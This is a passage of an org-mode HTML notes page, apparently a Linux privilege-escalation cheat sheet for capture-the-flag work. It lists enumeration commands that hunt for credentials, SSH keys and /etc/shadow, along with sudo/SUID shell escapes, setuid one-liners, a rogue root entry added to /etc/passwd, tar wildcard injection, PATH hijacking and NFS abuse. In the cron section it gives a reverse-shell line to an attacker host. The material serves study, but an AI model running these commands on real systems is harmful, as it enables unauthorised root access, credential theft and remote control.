+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_ece110e6c6e643fc821290bd44439d8e>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_ece110e6c6e643fc821290bd44439d8e=document.querySelector('button[name=btn_ece110e6c6e643fc821290bd44439d8e]');
+copyBtnbtn_ece110e6c6e643fc821290bd44439d8e.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`find / -perm -4000 -type f 2>/dev/null    # SUID\nfind / -perm -2000 -type f 2>/dev/null    # SGID\n`);copyBtnbtn_ece110e6c6e643fc821290bd44439d8e.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_ece110e6c6e643fc821290bd44439d8e.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell">find / -perm -4000 -type f 2&gt;/dev/null    <span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">SUID
+</span>find / -perm -2000 -type f 2&gt;/dev/null    <span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">SGID</span>
+</pre>
+</div></div>
+<p>
+Cross-reference results against <a href="../org/20260314T005728--gtfobins__cybersecurity_tool.html">GTFOBins</a>.
+</p>
+</div>
+</div>
+<div id="outline-container-orgcd4f1ae" class="outline-3">
+<h3 id="orgcd4f1ae">Capabilities</h3>
+<div class="outline-text-3" id="text-orgcd4f1ae">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_182d2ac2d60f46e0899b84a98cfa5d07>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_182d2ac2d60f46e0899b84a98cfa5d07=document.querySelector('button[name=btn_182d2ac2d60f46e0899b84a98cfa5d07]');
+copyBtnbtn_182d2ac2d60f46e0899b84a98cfa5d07.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`getcap -r / 2>/dev/null\n# cap_setuid+ep on python/perl/ruby → trivial root\n`);copyBtnbtn_182d2ac2d60f46e0899b84a98cfa5d07.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_182d2ac2d60f46e0899b84a98cfa5d07.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell">getcap -r / 2&gt;/dev/null
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">cap_setuid+ep on python/perl/ruby &#8594; trivial root</span>
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-org853375e" class="outline-3">
+<h3 id="org853375e">Writable Files and Directories</h3>
+<div class="outline-text-3" id="text-org853375e">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_181960172c0c498b95da30950056f51d>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_181960172c0c498b95da30950056f51d=document.querySelector('button[name=btn_181960172c0c498b95da30950056f51d]');
+copyBtnbtn_181960172c0c498b95da30950056f51d.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# World-writable files\nfind / -writable -type f 2>/dev/null | grep -v proc\n\n# Writable directories in PATH\necho $PATH | tr ':' '\\n' | xargs -I{} find {} -writable 2>/dev/null\n`);copyBtnbtn_181960172c0c498b95da30950056f51d.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_181960172c0c498b95da30950056f51d.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">World-writable files
+</span>find / -writable -type f 2&gt;/dev/null | grep -v proc
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Writable directories in PATH
+</span><span style="color: var(--clr-builtin); background-color: var(--bg-builtin);">echo</span> $<span style="color: var(--clr-variable); background-color: var(--bg-variable);">PATH</span> | tr <span style="color: var(--clr-string); background-color: var(--bg-string);">':'</span> <span style="color: var(--clr-string); background-color: var(--bg-string);">'\n'</span> | xargs -I{} find {} -writable 2&gt;/dev/null
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-org7ed97c3" class="outline-3">
+<h3 id="org7ed97c3">Cron Jobs</h3>
+<div class="outline-text-3" id="text-org7ed97c3">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_40103ef383054a4e88ddf7fc822c4ed4>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_40103ef383054a4e88ddf7fc822c4ed4=document.querySelector('button[name=btn_40103ef383054a4e88ddf7fc822c4ed4]');
+copyBtnbtn_40103ef383054a4e88ddf7fc822c4ed4.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`cat /etc/crontab\nls -la /etc/cron*\ncrontab -l\n# Watch for running processes — catch cron jobs in flight\nwatch -n 1 ps aux\n# Or use pspy (no root needed)\n./pspy64\n`);copyBtnbtn_40103ef383054a4e88ddf7fc822c4ed4.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_40103ef383054a4e88ddf7fc822c4ed4.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell">cat /etc/crontab
+ls -la /etc/cron*
+crontab -l
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Watch for running processes &#8212; catch cron jobs in flight
+</span>watch -n 1 ps aux
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Or use pspy (no root needed)
+</span>./pspy64
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-org39b6d06" class="outline-3">
+<h3 id="org39b6d06">Interesting Files</h3>
+<div class="outline-text-3" id="text-org39b6d06">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_b469d01f868c4cf9856cda81b2d204df>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_b469d01f868c4cf9856cda81b2d204df=document.querySelector('button[name=btn_b469d01f868c4cf9856cda81b2d204df]');
+copyBtnbtn_b469d01f868c4cf9856cda81b2d204df.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Config files with credentials\ngrep -r \"password\\|passwd\\|secret\\|key\" /var/www /opt /home 2>/dev/null\n\n# SSH keys\nfind / -name \"id_rsa\" -o -name \"id_ecdsa\" 2>/dev/null\ncat ~/.ssh/authorized_keys\n\n# History files\ncat ~/.bash_history\ncat ~/.zsh_history\n\n# Shadow file (readable = game over)\ncat /etc/shadow 2>/dev/null\n`);copyBtnbtn_b469d01f868c4cf9856cda81b2d204df.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_b469d01f868c4cf9856cda81b2d204df.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Config files with credentials
+</span>grep -r <span style="color: var(--clr-string); background-color: var(--bg-string);">"password\|passwd\|secret\|key"</span> /var/www /opt /home 2&gt;/dev/null
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">SSH keys
+</span>find / -name <span style="color: var(--clr-string); background-color: var(--bg-string);">"id_rsa"</span> -o -name <span style="color: var(--clr-string); background-color: var(--bg-string);">"id_ecdsa"</span> 2&gt;/dev/null
+cat ~/.ssh/authorized_keys
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">History files
+</span>cat ~/.bash_history
+cat ~/.zsh_history
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Shadow file (readable = game over)
+</span>cat /etc/shadow 2&gt;/dev/null
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-org81f387e" class="outline-3">
+<h3 id="org81f387e">Network and Services</h3>
+<div class="outline-text-3" id="text-org81f387e">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_b1f4b1dc8ba04be893a0932a900414d9>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_b1f4b1dc8ba04be893a0932a900414d9=document.querySelector('button[name=btn_b1f4b1dc8ba04be893a0932a900414d9]');
+copyBtnbtn_b1f4b1dc8ba04be893a0932a900414d9.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`ss -tlnp                          # listening ports\nnetstat -tlnp 2>/dev/null\ncat /etc/hosts\n`);copyBtnbtn_b1f4b1dc8ba04be893a0932a900414d9.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_b1f4b1dc8ba04be893a0932a900414d9.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell">ss -tlnp                          <span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">listening ports
+</span>netstat -tlnp 2&gt;/dev/null
+cat /etc/hosts
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-orga13c176" class="outline-3">
+<h3 id="orga13c176">NFS</h3>
+<div class="outline-text-3" id="text-orga13c176">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_2010fea1ca2d48fc812927d317caafa1>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_2010fea1ca2d48fc812927d317caafa1=document.querySelector('button[name=btn_2010fea1ca2d48fc812927d317caafa1]');
+copyBtnbtn_2010fea1ca2d48fc812927d317caafa1.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`cat /etc/exports\n# no_root_squash on a share → mount it from attacker, create SUID binary\nshowmount -e $IP                  # from attacker\n`);copyBtnbtn_2010fea1ca2d48fc812927d317caafa1.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_2010fea1ca2d48fc812927d317caafa1.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell">cat /etc/exports
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">no_root_squash on a share &#8594; mount it from attacker, create SUID binary
+</span>showmount -e $<span style="color: var(--clr-variable); background-color: var(--bg-variable);">IP</span>                  <span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">from attacker</span>
+</pre>
+</div></div>
+</div>
+</div>
+</div>
+<div id="outline-container-org8eeac92" class="outline-2">
+<h2 id="org8eeac92">3. Exploitation Vectors</h2>
+<div class="outline-text-2" id="text-org8eeac92">
+</div>
+<div id="outline-container-org5937293" class="outline-3">
+<h3 id="org5937293">Sudo Abuse</h3>
+<div class="outline-text-3" id="text-org5937293">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_aa1c7737114741948e182168f4e1b384>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_aa1c7737114741948e182168f4e1b384=document.querySelector('button[name=btn_aa1c7737114741948e182168f4e1b384]');
+copyBtnbtn_aa1c7737114741948e182168f4e1b384.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`sudo -l\n# Common exploitable patterns:\nsudo /usr/bin/vim       → :!bash\nsudo /usr/bin/find      → sudo find / -exec /bin/bash \\;\nsudo /usr/bin/python3   → sudo python3 -c 'import os; os.system(\"/bin/bash\")'\nsudo /usr/bin/less      → !bash (within less)\nsudo /usr/bin/awk       → sudo awk 'BEGIN {system(\"/bin/bash\")}'\n`);copyBtnbtn_aa1c7737114741948e182168f4e1b384.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_aa1c7737114741948e182168f4e1b384.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell">sudo -l
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Common exploitable patterns:
+</span>sudo /usr/bin/vim       &#8594; :!bash
+sudo /usr/bin/find      &#8594; sudo find / -exec /bin/bash <span style="color: var(--clr-string); background-color: var(--bg-string);">\;</span>
+sudo /usr/bin/python3   &#8594; sudo python3 -c <span style="color: var(--clr-string); background-color: var(--bg-string);">'import os; os.system("/bin/bash")'</span>
+sudo /usr/bin/less      &#8594; !bash (within less)
+sudo /usr/bin/awk       &#8594; sudo awk <span style="color: var(--clr-string); background-color: var(--bg-string);">'BEGIN {system("/bin/bash")}'</span>
+</pre>
+</div></div>
+
+<p>
+Check <a href="../org/20260314T005728--gtfobins__cybersecurity_tool.html">GTFOBins</a> for the exact payload for any binary <code>sudo -l</code> reveals.
+</p>
+</div>
+</div>
+<div id="outline-container-org43545b2" class="outline-3">
+<h3 id="org43545b2">SUID Binary Abuse</h3>
+<div class="outline-text-3" id="text-org43545b2">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_764ce7eb11cd422caba39f8dc81835c0>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_764ce7eb11cd422caba39f8dc81835c0=document.querySelector('button[name=btn_764ce7eb11cd422caba39f8dc81835c0]');
+copyBtnbtn_764ce7eb11cd422caba39f8dc81835c0.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Find SUID binaries then check GTFOBins for each\nfind / -perm -4000 -type f 2>/dev/null\n\n# Common quick wins\n/usr/bin/find -exec /bin/sh -p \\; -quit\n/usr/bin/vim -c ':!/bin/sh'\n# python, perl, bash with SUID — check GTFOBins for exact payload\n`);copyBtnbtn_764ce7eb11cd422caba39f8dc81835c0.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_764ce7eb11cd422caba39f8dc81835c0.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Find SUID binaries then check GTFOBins for each
+</span>find / -perm -4000 -type f 2&gt;/dev/null
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Common quick wins
+</span>/usr/bin/find -exec /bin/sh -p <span style="color: var(--clr-string); background-color: var(--bg-string);">\;</span> -quit
+/usr/bin/vim -c <span style="color: var(--clr-string); background-color: var(--bg-string);">':!/bin/sh'</span>
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">python, perl, bash with SUID &#8212; check GTFOBins for exact payload</span>
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-orge64de45" class="outline-3">
+<h3 id="orge64de45">Capabilities Abuse</h3>
+<div class="outline-text-3" id="text-orge64de45">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_45d4977a3c3740f5a6b90138b7c851d6>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_45d4977a3c3740f5a6b90138b7c851d6=document.querySelector('button[name=btn_45d4977a3c3740f5a6b90138b7c851d6]');
+copyBtnbtn_45d4977a3c3740f5a6b90138b7c851d6.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# python3 with cap_setuid\npython3 -c \"import os; os.setuid(0); os.system('/bin/bash')\"\n\n# perl with cap_setuid\nperl -e 'use POSIX qw(setuid); setuid(0); exec \"/bin/bash\"'\n`);copyBtnbtn_45d4977a3c3740f5a6b90138b7c851d6.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_45d4977a3c3740f5a6b90138b7c851d6.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">python3 with cap_setuid
+</span>python3 -c <span style="color: var(--clr-string); background-color: var(--bg-string);">"import os; os.setuid(0); os.system('/bin/bash')"</span>
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">perl with cap_setuid
+</span>perl -e <span style="color: var(--clr-string); background-color: var(--bg-string);">'use POSIX qw(setuid); setuid(0); exec "/bin/bash"'</span>
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-org6a642d4" class="outline-3">
+<h3 id="org6a642d4">Writable /etc/passwd</h3>
+<div class="outline-text-3" id="text-org6a642d4">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_465515b22e9a4af3921fd81271340699>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_465515b22e9a4af3921fd81271340699=document.querySelector('button[name=btn_465515b22e9a4af3921fd81271340699]');
+copyBtnbtn_465515b22e9a4af3921fd81271340699.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Generate password hash\nopenssl passwd -1 -salt xyz hacked\n\n# Append new root user\necho 'hacker:$1$xyz$<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd\nsu hacker\n`);copyBtnbtn_465515b22e9a4af3921fd81271340699.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_465515b22e9a4af3921fd81271340699.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Generate password hash
+</span>openssl passwd -1 -salt xyz hacked
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Append new root user
+</span><span style="color: var(--clr-builtin); background-color: var(--bg-builtin);">echo</span> <span style="color: var(--clr-string); background-color: var(--bg-string);">'hacker:$1$xyz$&lt;hash&gt;:0:0:root:/root:/bin/bash'</span> &gt;&gt; /etc/passwd
+su hacker
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-org22495c3" class="outline-3">
+<h3 id="org22495c3">Cron Job Abuse</h3>
+<div class="outline-text-3" id="text-org22495c3">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_5b8d8b93c7fb4b4db00435da57ea2f9e>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_5b8d8b93c7fb4b4db00435da57ea2f9e=document.querySelector('button[name=btn_5b8d8b93c7fb4b4db00435da57ea2f9e]');
+copyBtnbtn_5b8d8b93c7fb4b4db00435da57ea2f9e.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# If a cron script is world-writable\necho 'bash -i >& /dev/tcp/$ATTACKER/4444 0>&1' >> /path/to/cron_script.sh\n\n# If cron uses a wildcard (tar, chown, chmod)\n# Create files named to inject arguments\ntouch -- '--checkpoint=1'\ntouch -- '--checkpoint-action=exec=bash shell.sh'\n`);copyBtnbtn_5b8d8b93c7fb4b4db00435da57ea2f9e.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_5b8d8b93c7fb4b4db00435da57ea2f9e.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">If a cron script is world-writable
+</span><span style="color: var(--clr-builtin); background-color: var(--bg-builtin);">echo</span> <span style="color: var(--clr-string); background-color: var(--bg-string);">'bash -i &gt;&amp; /dev/tcp/$ATTACKER/4444 0&gt;&amp;1'</span> &gt;&gt; /path/to/cron_script.sh
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">If cron uses a wildcard (tar, chown, chmod)
+</span><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Create files named to inject arguments
+</span>touch -- <span style="color: var(--clr-string); background-color: var(--bg-string);">'--checkpoint=1'</span>
+touch -- <span style="color: var(--clr-string); background-color: var(--bg-string);">'--checkpoint-action=exec=bash shell.sh'</span>
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-org004accb" class="outline-3">
+<h3 id="org004accb">Path Hijacking</h3>
+<div class="outline-text-3" id="text-org004accb">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_e2f81d30f5b04bfb9238d292da4c45a5>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_e2f81d30f5b04bfb9238d292da4c45a5=document.querySelector('button[name=btn_e2f81d30f5b04bfb9238d292da4c45a5]');
+copyBtnbtn_e2f81d30f5b04bfb9238d292da4c45a5.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# If a SUID binary calls a command without full path\nstrings /usr/local/bin/suid_binary | grep -v '/'   # find relative calls\n\n# Create malicious binary earlier in PATH\nexport PATH=/tmp:$PATH\necho '/bin/bash -p' > /tmp/targetcommand\nchmod +x /tmp/targetcommand\n/usr/local/bin/suid_binary\n`);copyBtnbtn_e2f81d30f5b04bfb9238d292da4c45a5.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_e2f81d30f5b04bfb9238d292da4c45a5.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">If a SUID binary calls a command without full path
+</span>strings /usr/local/bin/suid_binary | grep -v <span style="color: var(--clr-string); background-color: var(--bg-string);">'/'</span>   <span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">find relative calls
+</span>
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Create malicious binary earlier in PATH
+</span><span style="color: var(--clr-builtin); background-color: var(--bg-builtin);">export</span> <span style="color: var(--clr-variable); background-color: var(--bg-variable);">PATH</span>=/tmp:$<span style="color: var(--clr-variable); background-color: var(--bg-variable);">PATH</span>
+<span style="color: var(--clr-builtin); background-color: var(--bg-builtin);">echo</span> <span style="color: var(--clr-string); background-color: var(--bg-string);">'/bin/bash -p'</span> &gt; /tmp/targetcommand
+chmod +x /tmp/targetcommand
+/usr/local/bin/suid_binary
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-orgc223bc2" class="outline-3">
+<h3 id="orgc223bc2">Kernel Exploits</h3>
+<div class="outline-text-3" id="text-orgc223bc2">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_eebbfe65e1a74f238a613cfa2d704f81>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_eebbfe65e1a74f238a613cfa2d704f81=document.querySelector('button[name=btn_eebbfe65e1a74f238a613cfa2d704f81]');
+copyBtnbtn_eebbfe65e1a74f238a613cfa2d704f81.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`uname -r\n# Cross-reference against exploit-db or use:\n./linux-exploit-suggester.sh\n./linux-exploit-suggester-2.pl\n\n# Common: DirtyCow (CVE-2016-5195), overlayfs (CVE-2015-1328)\n# Kernel exploits are last resort — noisy and may crash the system\n`);copyBtnbtn_eebbfe65e1a74f238a613cfa2d704f81.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_eebbfe65e1a74f238a613cfa2d704f81.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell">uname -r
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Cross-reference against exploit-db or use:
+</span>./linux-exploit-suggester.sh
+./linux-exploit-suggester-2.pl
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Common: DirtyCow (CVE-2016-5195), overlayfs (CVE-2015-1328)
+</span><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Kernel exploits are last resort &#8212; noisy and may crash the system</span>
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-orgf4c0e15" class="outline-3">
+<h3 id="orgf4c0e15">NFS no<sub>root</sub><sub>squash</sub></h3>
+<div class="outline-text-3" id="text-orgf4c0e15">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_2ada1faca6f9465a826b8d2fc0f0f0ad>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_2ada1faca6f9465a826b8d2fc0f0f0ad=document.querySelector('button[name=btn_2ada1faca6f9465a826b8d2fc0f0f0ad]');
+copyBtnbtn_2ada1faca6f9465a826b8d2fc0f0f0ad.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# On attacker — mount the share\nmkdir /tmp/nfs\nmount -t nfs $TARGET:/share /tmp/nfs\n\n# Create SUID bash\ncp /bin/bash /tmp/nfs/bash\nchmod +s /tmp/nfs/bash\n\n# On target — execute\n/share/bash -p\n`);copyBtnbtn_2ada1faca6f9465a826b8d2fc0f0f0ad.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_2ada1faca6f9465a826b8d2fc0f0f0ad.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">On attacker &#8212; mount the share
+</span>mkdir /tmp/nfs
+mount -t nfs $<span style="color: var(--clr-variable); background-color: var(--bg-variable);">TARGET</span>:/share /tmp/nfs
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Create SUID bash
+</span>cp /bin/bash /tmp/nfs/bash
+chmod +s /tmp/nfs/bash
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">On target &#8212; execute
+</span>/share/bash -p
+</pre>
+</div></div>
+</div>
+</div>
+</div>
+<div id="outline-container-org24ad65f" class="outline-2">
+<h2 id="org24ad65f">4. Quick Wins to Check First</h2>
+<div class="outline-text-2" id="text-org24ad65f">
+<p>
+In order — these resolve the fastest in CTF contexts:
+</p>
+
+<ol class="org-ol">
+<li><code>sudo -l</code> — any entry without password is immediate</li>
+<li>SUID on <code>find</code>, <code>vim</code>, <code>python</code>, <code>perl</code>, <code>bash</code></li>
+<li>Capabilities on interpreters</li>
+<li>World-writable cron scripts</li>
+<li>Credentials in files (<code>grep -r password</code>)</li>
+<li>Writable <code>/etc/passwd</code></li>
+<li>Kernel version against known CVEs</li>
+</ol>
+</div>
+</div>
+<div id="outline-container-orgb82dc67" class="outline-2">
+<h2 id="orgb82dc67">Tips</h2>
+<div class="outline-text-2" id="text-orgb82dc67">
+<ul class="org-ul">
+<li>Run LinPEAS first but do not just follow the red findings blindly —
+read the full output before acting</li>
+<li>pspy is essential when cron jobs are the suspected vector — lets
+you watch process execution in real time without root</li>
+<li>NFS <code>no_root_squash</code> is frequently overlooked and trivially
+exploitable — always check <code>/etc/exports</code></li>
+<li>Kernel exploits are noisy and can destabilise the target — exhaust
+all misconfiguration vectors first</li>
+<li>GTFOBins covers almost every binary you will encounter via SUID
+or sudo — keep it open throughout enumeration</li>
+</ul>
+</div>
+</div>
+</div>
+<div id="postamble" class="status">
+<script type="text/javascript">
+<!--/*--><![CDATA[/*><!--*/
+if (!document.cookie.split('; ').find(r => r.startsWith('mode'))) {
+document.cookie = 'mode=dark'
+}
+document.cookie = 'light=modus-operandi-tinted'
+document.cookie = 'dark=modus-vivendi-tinted'
+/*
+;; nice-org-html.js
+;;==============================================================================
+;; Copyright (C) 2024, Ewan Townshend
+
+;; Author: Ewan Townshend
+;; URL: https://github.com/ewantown/nice-org-html
+;; Version: 1.2
+
+;;==============================================================================
+;; This program is free software; you can redistribute it and/or modify
+;; it under the terms of the GNU General Public License as published by
